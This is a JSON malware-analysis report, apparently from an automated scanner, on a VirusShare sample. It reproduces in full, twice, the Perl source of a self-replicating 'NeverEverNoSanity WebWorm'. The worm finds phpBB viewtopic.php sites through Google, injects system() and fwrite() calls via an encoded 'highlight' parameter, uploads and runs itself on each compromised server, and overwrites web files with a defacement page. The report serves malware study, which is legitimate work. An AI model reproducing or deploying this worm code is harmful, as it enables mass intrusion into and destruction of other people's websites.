{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "User-Agent": "May download files from the Internet",
            "Windows": "May enumerate application windows",
            "chr": "May attempt to obfuscate specific str",
            "open": "May open a file"
        },
        "macro": "perl -e \"open OUT,q(>m1ho2of) and print q(HYv9po4z3jjHWanN)\"\n\n\nm1ho2of file:\n#!/usr/bin/perl\nuse strict;\nuse Socket;\nsub PayLoad();\nsub ($);\nsub GoGoogle();\nsub GrabURL($);\nsub\n str2chr($);\n\neval{ \nfork and exit; };\n\nmy $generation = 8;\nPayLoad() if $generation > 3;\n\nopen IN, $0 or exit;\nmy $self = join '', <IN>;\nclose IN;\nunlink $0;\n\nwhile(!GrabURL('http://www.google.com/advanced_search')) {\n    \nif($generation > 3) \n{\n        PayLoad() ;\n    } else {\n        exit;\n    }\n}\n\n\n$self =~ s/my \\$generation = (\\d+);/'my $generation = ' . ($1 + 1) . ';'/e;\nmy $selfFileName = 'm1ho2of';\nmy $markStr = 'HYv9po4z3jjHWanN';\nmy $perlOpen = 'perl -e \"open OUT,q(>' . $selfFileName . ') and print q(' . $markStr . ')\"';my $tryCode = '&highlight=%2527%252Esystem(' . str2chr($perlOpen) . ')%252e%2527';\n\n\nwhile(1) {\n\n    exit if -e 'stop.it';\n\nOUTER: for my $url (GoGoogle()) {\n    exit if -e 'stop.it';\n    $url =~ s/&highlight=.*$//;\n    $url .= $tryCode;\n    my $r = GrabURL($url);\n    next unless defined $r;\n    next unless $r =~ /$markStr/;\n\n    while($self =~ /(.{1,20})/gs) {\n\n        \nmy $portion = '&highlight=%2527%252Efwrite(fopen(' .\n             str2chr($selfFileName) . ',' . str2chr('a') . '),' . str2chr($1) .\n            '),exit%252e%2527';\n        $url =~ s/&highlight=.*$//;\n        $url .= $portion;\n        next OUTER unless GrabURL($url);\n    }\n\n    my\n $syst = '&highlight=%2527%252Esystem(' . str2chr('perl ' . $selfFileName) .\n        ')%252e%2527';\n    $url =~ s/&highlight=.*$//;\n    $url .= $syst;    \nGrabURL($url);\n}\n}\n\n\n\nsub str2chr($) {\n\n    \nmy $s = shift;\n\n    $s =~ s/(.)/'chr(' . ord($1) . ')%252e'/seg;\n    $s =~ s/%252e$//;\n    return $s;\n}\n\n\nsub\n GoGoogle() {\n\n    my @urls;\n    my @ts = qw/t p topic/;\n    my $startURL = 'http://www.google.com/search?num=100&hl=en&lr=&as_qdr=all' .\n        '&q=allinurl%3A+%22viewtopic.php%22+%22' . \n        $ts[int(rand(@ts))] . '%3D' . int(rand(30000)) . '%22&btnG=Search';\n\n    my $goo1st = GrabURL($startURL);\n    return unless defined $goo1st;\n    my $allGoo = $goo1st;\n\n    my $r = '<td><a href=(/search\\?q=.+?)' .\n        '><img src=/nav_page\\.gif width=16 height=26 alt=\"\" border=0><br>\\d+</a>';\n    while($goo1st =~ m#$r#g) {\n        $allGoo .= GrabURL('www.google.com' . $1);\n    }\n\n\n    \nwhile($allGoo =~ m#href=(http://\\S+viewtopic.php\\S+)#g) {\n    \n    my $u = $1;\n        next \nif $u =~ m#http://.*http://#i; # no redirects\n        push(@urls, $u);\n    }\n\n    return @urls;\n}\n\n\nsub GrabURL($) {\n\n    my $url = shift;\n    $url =~ s#^http://##i;\n\n    my ($host, $res) = $url =~ m#^(.+?)(/.*)#;\n    return unless defined($host) && defined($res);\n\n    my $r = \"GET $res HTTP/1.0\\015\\012\" .\n\n            \"Host: $host\\015\\012\" .\n            \"Accept: */*\\015\\012\" .\n            \"Accept-Language: en-us,en-gb;q=0.7,en;q=0.3\\015\\012\" .\n            \"Pragma: no-cache\\015\\012\" .\n            \"Cache-Control: no-cache\\015\\012\" .\n            \"Referer: http://\" . $host . $res . \"\\015\\012\" .\n            \"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\015\\012\" .\n            \"Connection: close\\015\\012\\015\\012\";\n    my $port = 80;\n    if($host =~ /(.*):(\\d+)$/){ $host = $1; $port = $2;}\n\n    my $internet_addr = inet_aton($host) or return;\n    socket(Server, PF_INET, SOCK_STREAM, getprotobyname('tcp')) or return;\n    setsockopt(Server, SOL_SOCKET, SO_RCVTIMEO, 10000);\n\n    connect(Server, sockaddr_in($port, $internet_addr)) or return;\n    select((select(Server), $| = 1)[0]);\n    print Server $r;\n\n    my $answer = join '', <Server></server>;\n    close(Server);\n    return $answer;\n}\n\n\nsub DoFile($) {\n\n    my $s = q{<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n<HTML><HEAD>\n<TITLE>This site is defaced!!!</TITLE>\n</HEAD><BODY bgcolor=\"#000000\" text=\"#FF0000\">\n<H1>This site is defaced!!!</H1>\n<HR>\n<ADDRESS><b>\nNeverEverNoSanity WebWorm generation } . $generation .q{.</b></ADDRESS>\n</BODY></HTML>\n};\n\n    unlink $_[0];\n    open OUT, \">$_[0]\" or return;\n    print OUT $s;\n    close OUT;\n}\n\n\nsub DoDir($)\n {\n\n    my $dir = $_[0];\n    $dir .= '/' unless $dir =~ m#/$#;\n    local *DIR;\n    opendir DIR, $dir or return;\n\n    for my $ent (grep { $_ ne '.' and $_ ne '..' } readdir DIR) {\n\n        unless(-l $dir . $ent) {\n            if(-d _) {\n                DoDir($dir . $ent);\n                next;\n\n            }\n        }\n\n        if($ent =~ /\\.htm/i or $ent =~ /\\.php/i or $ent =~ /\\.asp/i or $ent =~ /\\.shtm/i\n            or $ent =~ /\\.jsp/i or $ent =~ /\\.phtm/i) {\n            DoFile($dir . $ent);\n        }\n    }\n\n    closedir DIR;\n}\n\n\nsub PayLoad() {\n\n    my @dirs;\n\n    eval{\n        while(my @a = getpwent()) { push(@dirs, $a[7]);}\n\n    };\n\n    push(@dirs, '/');\n\n    for my $l ('A' .. 'Z') {\n        push(@dirs, $l . ':');\n    }\n\n\n    for my $d (@dirs) {\n DoDir($d); }\n}"
    },
    "filename": "VirusShare_4ad08373aaa7c96ad8ab4b93df4fd4a0",
    "filesize": 4996,
    "filetype": "HTML document, ASCII text, with CRLF line terminators",
    "hashes": {
        "md5": "4ad08373aaa7c96ad8ab4b93df4fd4a0",
        "sha1": "6e19349a279988732d8b213db02640351ce9226f",
        "sha256": "10a0c857109d097d53eb32974917542537d0753f62d2fa27083670aeb8141711"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "perl -e \"open OUT,q(>m1ho2of) and print q(HYv9po4z3jjHWanN)\"",
            "m1ho2of file:",
            "#!/usr/bin/perl",
            "use strict;",
            "use Socket;",
            "sub PayLoad();",
            "sub ($);",
            "sub GoGoogle();",
            "sub GrabURL($);",
            " str2chr($);",
            "eval{ ",
            "fork and exit; };",
            "my $generation = 8;",
            "PayLoad() if $generation > 3;",
            "open IN, $0 or exit;",
            "my $self = join '', <IN>;",
            "close IN;",
            "unlink $0;",
            "while(!GrabURL('http://www.google.com/advanced_search')) {",
            "    ",
            "if($generation > 3) ",
            "        PayLoad() ;",
            "    } else {",
            "        exit;",
            "    }",
            "$self =~ s/my \\$generation = (\\d+);/'my $generation = ' . ($1 + 1) . ';'/e;",
            "my $selfFileName = 'm1ho2of';",
            "my $markStr = 'HYv9po4z3jjHWanN';",
            "my $perlOpen = 'perl -e \"open OUT,q(>' . $selfFileName . ') and print q(' . $markStr . ')\"';my $tryCode = '&highlight=%2527%252Esystem(' . str2chr($perlOpen) . ')%252e%2527';",
            "while(1) {",
            "    exit if -e 'stop.it';",
            "OUTER: for my $url (GoGoogle()) {",
            "    exit if -e 'stop.it';",
            "    $url =~ s/&highlight=.*$//;",
            "    $url .= $tryCode;",
            "    my $r = GrabURL($url);",
            "    next unless defined $r;",
            "    next unless $r =~ /$markStr/;",
            "    while($self =~ /(.{1,20})/gs) {",
            "        ",
            "my $portion = '&highlight=%2527%252Efwrite(fopen(' .",
            "             str2chr($selfFileName) . ',' . str2chr('a') . '),' . str2chr($1) .",
            "            '),exit%252e%2527';",
            "        $url =~ s/&highlight=.*$//;",
            "        $url .= $portion;",
            "        next OUTER unless GrabURL($url);",
            "    }",
            "    my",
            " $syst = '&highlight=%2527%252Esystem(' . str2chr('perl ' . $selfFileName) .",
            "        ')%252e%2527';",
            "    $url =~ s/&highlight=.*$//;",
            "    $url .= $syst;    ",
            "GrabURL($url);",
            "sub str2chr($) {",
            "    ",
            "my $s = shift;",
            "    $s =~ s/(.)/'chr(' . ord($1) . ')%252e'/seg;",
            "    $s =~ s/%252e$//;",
            "    return $s;",
            " GoGoogle() {",
            "    my @urls;",
            "    my @ts = qw/t p topic/;",
            "    my $startURL = 'http://www.google.com/search?num=100&hl=en&lr=&as_qdr=all' .",
            "        '&q=allinurl%3A+%22viewtopic.php%22+%22' . ",
            "        $ts[int(rand(@ts))] . '%3D' . int(rand(30000)) . '%22&btnG=Search';",
            "    my $goo1st = GrabURL($startURL);",
            "    return unless defined $goo1st;",
            "    my $allGoo = $goo1st;",
            "    my $r = '<td><a href=(/search\\?q=.+?)' .",
            "        '><img src=/nav_page\\.gif width=16 height=26 alt=\"\" border=0><br>\\d+</a>';",
            "    while($goo1st =~ m#$r#g) {",
            "        $allGoo .= GrabURL('www.google.com' . $1);",
            "    }",
            "    ",
            "while($allGoo =~ m#href=(http://\\S+viewtopic.php\\S+)#g) {",
            "    ",
            "    my $u = $1;",
            "        next ",
            "if $u =~ m#http://.*http://#i; # no redirects",
            "        push(@urls, $u);",
            "    }",
            "    return @urls;",
            "sub GrabURL($) {",
            "    my $url = shift;",
            "    $url =~ s#^http://##i;",
            "    my ($host, $res) = $url =~ m#^(.+?)(/.*)#;",
            "    return unless defined($host) && defined($res);",
            "    my $r = \"GET $res HTTP/1.0\\015\\012\" .",
            "            \"Host: $host\\015\\012\" .",
            "            \"Accept: */*\\015\\012\" .",
            "            \"Accept-Language: en-us,en-gb;q=0.7,en;q=0.3\\015\\012\" .",
            "            \"Pragma: no-cache\\015\\012\" .",
            "            \"Cache-Control: no-cache\\015\\012\" .",
            "            \"Referer: http://\" . $host . $res . \"\\015\\012\" .",
            "            \"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\015\\012\" .",
            "            \"Connection: close\\015\\012\\015\\012\";",
            "    my $port = 80;",
            "    if($host =~ /(.*):(\\d+)$/){ $host = $1; $port = $2;}",
            "    my $internet_addr = inet_aton($host) or return;",
            "    socket(Server, PF_INET, SOCK_STREAM, getprotobyname('tcp')) or return;",
            "    setsockopt(Server, SOL_SOCKET, SO_RCVTIMEO, 10000);",
            "    connect(Server, sockaddr_in($port, $internet_addr)) or return;",
            "    select((select(Server), $| = 1)[0]);",
            "    print Server $r;",
            "    my $answer = join '', <Server></server>;",
            "    close(Server);",
            "    return $answer;",
            "sub DoFile($) {",
            "    my $s = q{<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">",
            "<HTML><HEAD>",
            "<TITLE>This site is defaced!!!</TITLE>",
            "</HEAD><BODY bgcolor=\"#000000\" text=\"#FF0000\">",
            "<H1>This site is defaced!!!</H1>",
            "<HR>",
            "<ADDRESS><b>",
            "NeverEverNoSanity WebWorm generation } . $generation .q{.</b></ADDRESS>",
            "</BODY></HTML>",
            "    unlink $_[0];",
            "    open OUT, \">$_[0]\" or return;",
            "    print OUT $s;",
            "    close OUT;",
            "sub DoDir($)",
            "    my $dir = $_[0];",
            "    $dir .= '/' unless $dir =~ m#/$#;",
            "    local *DIR;",
            "    opendir DIR, $dir or return;",
            "    for my $ent (grep { $_ ne '.' and $_ ne '..' } readdir DIR) {",
            "        unless(-l $dir . $ent) {",
            "            if(-d _) {",
            "                DoDir($dir . $ent);",
            "                next;",
            "            }",
            "        }",
            "        if($ent =~ /\\.htm/i or $ent =~ /\\.php/i or $ent =~ /\\.asp/i or $ent =~ /\\.shtm/i",
            "            or $ent =~ /\\.jsp/i or $ent =~ /\\.phtm/i) {",
            "            DoFile($dir . $ent);",
            "        }",
            "    }",
            "    closedir DIR;",
            "sub PayLoad() {",
            "    my @dirs;",
            "    eval{",
            "        while(my @a = getpwent()) { push(@dirs, $a[7]);}",
            "    };",
            "    push(@dirs, '/');",
            "    for my $l ('A' .. 'Z') {",
            "        push(@dirs, $l . ':');",
            "    }",
            "    for my $d (@dirs) {",
            " DoDir($d); }"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://##i",
            "http://#i",
            "http://\\S+viewtopic.php\\S+#g",
            "http://",
            "http://www.google.com/advanced_search",
            "http://.",
            "http://www.google.com/search?num=100&hl=en&lr=&as_qdr=all"
        ]
    },
    "time": "0:00:00.307380",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
